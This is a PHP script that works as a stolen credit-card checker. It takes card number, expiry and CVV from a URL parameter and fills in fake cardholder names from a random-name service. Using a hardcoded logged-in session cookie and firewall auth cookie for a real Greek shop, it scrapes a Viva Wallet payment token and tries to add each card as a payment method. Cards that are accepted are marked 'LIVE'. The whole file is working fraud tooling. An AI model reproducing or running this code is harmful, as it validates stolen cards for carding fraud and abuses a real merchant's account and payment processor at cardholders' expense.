<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1']; 
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://bioisland.gr/my-account/add-payment-method/",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HTTPHEADER => array(
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "cookie: __cfduid=d7c7fa1904adb0f32b32f78dfedbc26ca1618709191; _fbp=fb.1.1618709204124.524012781; _ga=GA1.2.520969004.1618709204; _gid=GA1.2.784920654.1618709204; cookie_notice_accepted=true; wordpress_logged_in_3c6d9543c6dadb094f774f77b9767854=cqwcqcqcq%7C1619918829%7CFGmna7BhckPsKTv9CqqcicSaRaYtyhoVu4LwsGPia7C%7C4519a311fa7e42d6cad0a009ae8f540bd454b7532d3be4fc3fe69f20d41c16d6; wfwaf-authcookie-a1c3de864e85261800a1c391b405218f=621%7C%7Caaabc6641a817f156fcf65284446929b0806c67eb776c8b843f5023d8804a14a; _gat_gtag_UA_139411812_3=1",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "ajax=true&quantity=1&directOrderId=6759"
    ));
    $pitoy = curl_exec($ch);
    curl_close($ch);

    $bearer = GetStr($pitoy, 'var vivawallet_params = {"token":"', '"');
    $nonce = GetStr($pitoy, '"add_payment_method_nonce":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://api.vivapayments.com/nativecheckout/v2/chargetokens",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HTTPHEADER => array(
            "Accept: */*",
            "Authorization: Bearer ".$bearer,
            "Content-Type: application/json",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => '{"Number":"'.$cc.'","CVC":"'.$cvv.'","HolderName":"'.$fname.' '.$lname.'","ExpirationYear":"'.substr($yy, 2, 4).'","ExpirationMonth":"'.$mm.'","Installments":"1","Amount":30,"AuthenticateCardholder":true}'
    ));
    $token = GetStr(curl_exec($ch), '"chargeToken":"', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://bioisland.gr/?wc-ajax=wc_vivawallet_add_payment_method",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HTTPHEADER => array(
            "accept: */*",
            "cookie: __cfduid=d7c7fa1904adb0f32b32f78dfedbc26ca1618709191; _fbp=fb.1.1618709204124.524012781; _ga=GA1.2.520969004.1618709204; _gid=GA1.2.784920654.1618709204; cookie_notice_accepted=true; wordpress_logged_in_3c6d9543c6dadb094f774f77b9767854=cqwcqcqcq%7C1619918829%7CFGmna7BhckPsKTv9CqqcicSaRaYtyhoVu4LwsGPia7C%7C4519a311fa7e42d6cad0a009ae8f540bd454b7532d3be4fc3fe69f20d41c16d6; wfwaf-authcookie-a1c3de864e85261800a1c391b405218f=621%7C%7Caaabc6641a817f156fcf65284446929b0806c67eb776c8b843f5023d8804a14a; _gat_gtag_UA_139411812_3=1",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "url=%2F%3Fwc-ajax%3Dwc_vivawallet_add_payment_method&security=$nonce&accessToken=$bearer&chargeToken=$token&cardNumberLast4=".substr($cc, 12, 16)."&expiryMonth=".ltrim($mm, "0")."&expiryYear=$yy&cardType=visa&installments=1&savePaymentMethod=false&orderId=&returnUrl=&isUserLoggedIn=1&relatedSubscription=false"
    ));
    $exec = curl_exec($ch);
    curl_close($ch);

    $response = GetStr($exec, '"messages":"', '!');

    if(strpos($exec, '"result":"success"')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Authorized</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
?>
